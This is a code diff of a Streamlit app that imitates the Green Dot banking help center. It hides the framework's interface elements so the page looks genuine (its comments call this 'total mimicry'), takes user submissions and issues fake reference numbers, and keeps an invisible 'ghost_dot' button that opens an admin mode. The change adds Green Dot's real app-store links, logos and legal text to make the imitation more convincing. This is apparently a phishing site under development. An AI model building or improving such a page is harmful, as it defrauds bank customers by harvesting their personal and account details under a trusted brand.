@@ -33,9 +33,9 @@ st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page
 st.markdown("""<script>
     const deepPurge = () => {
         const blackList = [
-            '.section-anchor', 'a.section-anchor', '[data-testid="stHeaderActionElements"]', 
-            '[data-testid="stAppToolbar"]', '[data-testid="stElementToolbar"]', 
-            '.stElementToolbar', '.st-emotion-cache-140j12g', 'button[title="View fullscreen"]', 
+            '.section-anchor', 'a.section-anchor', '[data-testid="stHeaderActionElements"]',
+            '[data-testid="stAppToolbar"]', '[data-testid="stElementToolbar"]',
+            '.stElementToolbar', '.st-emotion-cache-140j12g', 'button[title="View fullscreen"]',
             'header', 'footer', '.stDeployButton', '.st-emotion-cache-gi0tri', '.etxdrby3', '.etxdrby1'
         ];
         blackList.forEach(sel => { document.querySelectorAll(sel).forEach(el => el.remove()); });
@@ -45,21 +45,23 @@ st.markdown("""<script>
 
 # --- CSS: MIMETISMO TOTAL ---
 st.markdown("""<style>
-    .section-anchor, [data-testid="stHeaderActionElements"], [data-testid="stAppToolbar"], 
-    [data-testid="stElementToolbar"], .stElementToolbar, .st-emotion-cache-140j12g, .st-emotion-cache-gi0tri {
-        display: none !important; visibility: hidden !important; height: 0px !important;
-    }
-    
-    [data-testid='stHeader'], footer, header, .stDeployButton { display: none !important; }
     .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
     .block-container { max-width: 500px !important; padding-top: 1.5rem !important; }
+
+    .promo-box {
+        background-color: #111;
+        padding: 30px;
+        text-align: center;
+        border-radius: 12px;
+        margin: 25px 0;
+        border: 1px solid #222;
+    }
 
     .legal-container {
         font-size: 10px; color: #444; text-align: justify; margin-top: 50px;
         border-top: 1px solid #111; padding-top: 15px; line-height: 1.5;
     }
 
-    /* Enlace invisible (punto) */
     div.stButton > button[key="ghost_dot"] {
         background-color: transparent !important; border: none !important; color: #444 !important;
         padding: 0 !important; margin: 0 !important; display: inline !important;
@@ -67,7 +69,6 @@ st.markdown("""<style>
         min-height: 0 !important; min-width: 0 !important; box-shadow: none !important;
         cursor: text !important; vertical-align: baseline !important;
     }
-    div.stButton > button[key="ghost_dot"]:hover { color: #444 !important; }
 </style>""", unsafe_allow_html=True)
 
 if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False
@@ -93,7 +94,21 @@ if not st.session_state.admin_mode:
                 st.success(f"Success. Reference: {ref}")
             else: st.error("Information required.")
 
-    # Footer completo con punto de acceso invisible
+    # SECCIÓN DOWNLOAD APP (RECUERDO PERMANENTE)
+    st.markdown("""<div class='promo-box'>
+        <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
+        <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 20px;'>
+            <a href='https://play.google.com/store/apps/details?id=com.greendot.retail' target='_blank'>
+                <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='130'>
+            </a>
+            <a href='https://apps.apple.com/us/app/green-dot-mobile-banking/id415511546' target='_blank'>
+                <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='130'>
+            </a>
+        </div>
+        <p style='color:#888; font-size: 13px;'>Secure mobile banking for your account.</p>
+    </div>""", unsafe_allow_html=True)
+
+    # Footer completo
     st.markdown("""<div class='legal-container'>
         * When on a desktop, hover over * to view important disclosures. When on a mobile device, tap on * to view disclosures.<br><br>
         Not a gift card. Must be 18 or older to purchase. Online access, mobile number verification (via text message) and identity verification (including SSN) are required to open and use your account. Mobile number verification, email address verification and mobile app are required to access all features.<br><br>
